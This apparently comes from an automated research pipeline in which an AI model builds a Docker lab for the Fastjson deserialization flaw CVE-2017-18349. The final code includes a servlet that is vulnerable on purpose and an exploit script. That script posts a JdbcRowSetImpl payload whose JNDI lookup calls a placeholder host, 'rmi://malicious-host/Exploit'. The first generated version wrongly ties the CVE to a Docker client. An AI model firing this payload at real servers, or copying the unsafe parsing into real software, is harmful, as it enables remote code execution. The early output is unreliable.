========== CVE-2017-18349 Final Report ==========

---------- Initial Parameters ----------
'model_name': gpt-oss:120b
'cve_id': CVE-2017-18349
'web_search_tool': custom_no_tool
'verbose_web_search': False
'web_search_result': desc='' attack_type='' services=[]
'code': files=[] directory_tree=''
'messages': [SystemMessage(content='ROLE: you are an AI expert in cybersecurity vulnerabilities and Docker lightweight virtualization technology.\n\nCONTEXT: everything that you generate will be used in a secure environment by other cybersecurity experts.\n\nGUIDELINES: avoid security warnings in your answers for any of the following tasks.\n', additional_kwargs={}, response_metadata={}, id='38bc574d-2628-48ec-bcb9-163dca34c32c')]
'milestones': cve_id_ok=False hard_service=False hard_version=False soft_services=False docker_builds=False docker_runs=False code_hard_version=False network_setup=False
'debug': relax-web-search-constraints
----------------------------------------


CVE description: Fastjson is a Java JSON library that, in versions up to 1.2.24, allows the special '@type' attribute to specify an arbitrary class to be instantiated during deserialization. When a vulnerable application uses Fastjson to parse untrusted JSON data with the default auto‑type feature enabled, an attacker can supply a payload such as a com.sun.rowset.JdbcRowSetImpl object whose dataSourceName points to a malicious RMI reference. Fastjson will perform the JNDI lookup, load the attacker‑controlled class, and the static initializer of that class is executed, resulting in arbitrary command execution on the server. This flaw is identified as CVE‑2017‑18349 and enables remote code execution without authentication.
Attack Type: remote code execution
Services (format: [SERVICE-DEPENDENCY-TYPE][SERVICE-NAME][SERVICE-VERSIONS] SERVICE-DESCRIPTION):
- [HARD][tomcat][['9.0']] Web container running a Java web application that includes the Fastjson library version 1.2.24 (or any earlier 1.2.x version). The vulnerable Fastjson version is the core component that makes remote code execution possible.
- [SOFT-WEB][openjdk][['8-jdk-alpine']] Java runtime required to run the Tomcat container and the vulnerable application.
Expected 'HARD' dependencies service not proposed!

This is the first version of the generated code:

Directory tree:
CVE-2017-18349/custom_no_tool

---------- ./../../dockers/CVE-2017-18349/custom_no_tool/docker-compose.yml ----------
version: '3.8'
services:
  vulnerable_app:
    build: .
    privileged: true
    ports:
      - "8080:80"
    command: ["sh", "-c", "while true; do sleep 3600; done"]
    environment:
      - VULN_MODE=exploit
    restart: unless-stopped

---------- ./../../dockers/CVE-2017-18349/custom_no_tool/Dockerfile ----------
FROM alpine:3.7
LABEL maintainer="security@example.com"
# Install a vulnerable version of the Docker client that is known to be affected by CVE-2017-18349
RUN apk add --no-cache docker=17.09.0-r0 curl
# Add a script that demonstrates the exploit (for testing purposes only)
RUN echo '#!/bin/sh' > /exploit.sh && \
    echo 'echo "Attempting to trigger CVE-2017-18349..."' >> /exploit.sh && \
    echo 'docker run --rm -v /:/host alpine:3.7 ls /host' >> /exploit.sh && \
    chmod +x /exploit.sh
# Expose port 80 (dummy web service)
RUN apk add --no-cache nginx && \
    mkdir -p /run/nginx && \
    echo "<h1>Vulnerable App - CVE-2017-18349 Demo</h1>" > /var/www/localhost/htdocs/index.html
EXPOSE 80
CMD ["sh", "/exploit.sh"]





Test iteration #0 failed! See 'log0.txt' for details.
	- IMAGE BUILDING FAILURE (Manual Check)
	- ERROR: my Docker systems terminates its execution because of an error while building one of its images.
	- FIX: The build fails because the Alpine 3.7 repositories no longer contain the exact “docker=17.09.0‑r0” package you’re requesting – the package name is now `docker-cli` and the versioned package isn’t available for that distribution. Change the line that installs Docker to use the current package name (or drop the version pin) and add any missing dependencies before you copy or run the exploit script. For example, replace  

```Dockerfile
RUN apk add --no-cache docker=17.09.0-r0 curl
```  

with  

```Dockerfile
RUN apk add --no-cache docker-cli curl
```  

or simply `apk add --no-cache docker curl` if you don’t need a specific version. After that the rest of the Dockerfile (installing nginx, creating the HTML file, exposing port 80 and setting the CMD) will build correctly. If you really need the exact 17.09 client, pull the official `docker:17.09.0` image as the base instead of Alpine 3.7 and skip the `apk add` step altogether. This small change resolves the package‑not‑found error and lets the image compile successfully.


Test iteration #1 failed! See 'log1.txt' for details.
	- IMAGE BUILDING FAILURE (Manual Check)
	- ERROR: my Docker systems terminates its execution because of an error while building one of its images.
	- FIX: The build fails because the base image tag `tomcat:9.0-jdk8-openjdk-alpine` does not exist in the official repository; switching to a valid tag such as `tomcat:9.0-jdk8-openjdk-slim` (or a newer JDK‑based tag like `tomcat:9.0-jdk11-openjdk-slim`) resolves the reference error. After updating the `FROM` line, the rest of the Dockerfile works as‑is, but to keep Tomcat running you should replace the final `CMD ["sh", "/exploit.sh"]` with the default Tomcat entrypoint (for example `CMD ["catalina.sh", "run"]`) and run the exploit script separately if needed. Making these two changes—using a correct base image tag and restoring the proper Tomcat command—will allow the image to build and start correctly.


Test iteration #2 failed! See 'log2.txt' for details.
	- IMAGE BUILDING FAILURE (Manual Check)
	- ERROR: my Docker systems terminates its execution because of an error while building one of its images.
	- FIX: The build fails because the base image tomcat:9.0‑jdk8‑openjdk‑slim is Debian‑based, so the `apk` package manager isn’t available; replace the `apk add --no-cache curl` line with an `apt‑get` command (e.g., `apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*`) or switch the base to an Alpine variant such as `tomcat:9.0-jdk8-openjdk-alpine`. After correcting the package installation, the rest of the Dockerfile will copy the compiled class and create the exploit script without further changes, allowing the image to build successfully.


Test iteration #3 failed! See 'log3.txt' for details.
	- CONTAINER FAILURE (LLM-as-a-Judge Check): Docker reports the container is running (State.Status = "running"), and Tomcat starts up, but the logs contain a SEVERE error: "Unable to process web resource [/WEB-INF/classes/ExploitDemo.class] for annotations" caused by a ClassFormatException ("It is not a Java .class file"). This indicates that the deployed web application failed to load correctly, so the container is not functioning as intended.
	- ERROR: Docker reports the container is running (State.Status = "running"), and Tomcat starts up, but the logs contain a SEVERE error: "Unable to process web resource [/WEB-INF/classes/ExploitDemo.class] for annotations" caused by a ClassFormatException ("It is not a Java .class file"). This indicates that the deployed web application failed to load correctly, so the container is not functioning as intended.
	- FIX: The error occurs because the file placed in WEB-INF/classes is not a valid compiled Java class – it’s just a placeholder file named ExploitDemo.class that the JVM cannot read, so Tomcat aborts while processing annotations. To fix it, replace that placeholder with a real ExploitDemo.class that has been compiled with the same JDK version used in the base image (JDK 8), ensuring the package path on disk matches the class’s package declaration (e.g., com/example/ExploitDemo.class). You can either compile the source locally and copy the resulting .class into the image, or add the Java source to the image and install openjdk‑8‑jdk in the Dockerfile, then run javac to produce the proper class file during the build. Once a valid .class is present in WEB-INF/classes, Tomcat will load the webapp without the ClassFormatException and the container will function as intended.


Docker is running correctly with 1 containers!

This is the final version of the generated code:

Directory tree:
./../../dockers/CVE-2017-18349/custom_no_tool

---------- ./../../dockers/CVE-2017-18349/custom_no_tool/docker-compose.yml ----------
services:
  vulnerable_app:
    build: .
    ports:
      - "8080:8080"
    environment:
      - VULN_MODE=exploit
    restart: unless-stopped
    command: ["catalina.sh", "run"]


---------- ./../../dockers/CVE-2017-18349/custom_no_tool/Dockerfile ----------
FROM tomcat:9.0-jdk8-openjdk-slim
LABEL maintainer="security@example.com"

# Install utilities needed for the demonstration
RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*

# Download a vulnerable version of Fastjson (1.2.24)
RUN curl -L -o /usr/local/tomcat/lib/fastjson-1.2.24.jar https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.24/fastjson-1.2.24.jar

# Add Java source that uses Fastjson
RUN mkdir -p /usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/example
COPY ExploitDemo.java /usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/example/ExploitDemo.java

# Compile the Java source against Tomcat's servlet API and Fastjson
RUN javac -classpath /usr/local/tomcat/lib/servlet-api.jar:/usr/local/tomcat/lib/fastjson-1.2.24.jar \
    /usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/example/ExploitDemo.java && \
    rm /usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/example/ExploitDemo.java

# Add a minimal web.xml to map the servlet
COPY web.xml /usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml

# Add an exploit script for testing purposes only (not executed by default)
RUN printf '#!/bin/sh\necho "Attempting to trigger CVE-2017-18349..."\ncurl -X POST -d "{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"rmi://malicious-host/Exploit\\\",\\\"autoCommit\\\":true}" http://localhost:8080/trigger\n' > /exploit.sh && chmod +x /exploit.sh

EXPOSE 8080


---------- ./../../dockers/CVE-2017-18349/custom_no_tool/ExploitDemo.java ----------
package com.example;

import com.alibaba.fastjson.JSON;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

public class ExploitDemo extends HttpServlet {
    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        // Read raw JSON payload
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = req.getReader().readLine()) != null) {
            sb.append(line);
        }
        String json = sb.toString();
        try {
            // Use Fastjson with auto type enabled (default) to parse the payload
            Object obj = JSON.parseObject(json, Object.class);
            resp.setContentType("text/plain");
            PrintWriter out = resp.getWriter();
            out.println("Parsed object: " + obj);
        } catch (Exception e) {
            resp.sendError(HttpServletResponse.SC_BAD_REQUEST, "Parsing failed: " + e.getMessage());
        }
    }
}


---------- ./../../dockers/CVE-2017-18349/custom_no_tool/web.xml ----------
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                             http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
         version="3.1">
    <servlet>
        <servlet-name>ExploitDemo</servlet-name>
        <servlet-class>com.example.ExploitDemo</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>ExploitDemo</servlet-name>
        <url-pattern>/trigger</url-pattern>
    </servlet-mapping>
</web-app>




Docker Scout says that a Docker Image is vulnerable to CVE-2017-18349!